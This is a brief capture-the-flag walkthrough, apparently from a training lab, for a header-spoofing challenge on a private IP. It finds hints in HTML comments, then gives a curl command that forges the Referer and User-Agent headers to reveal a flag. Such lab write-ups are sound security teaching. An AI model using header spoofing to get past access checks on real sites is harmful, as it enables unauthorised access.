# Spoof exploit walkthrough

http://172.28.128.136/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

### 1. Open DevTools -> Sources section and read the entire html file

There are comments in the code that suggest to make a requet with Referer and User-Agent headers

---

### 2. Do a curl request:

`curl -s "http://172.28.128.136/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" | grep flag`
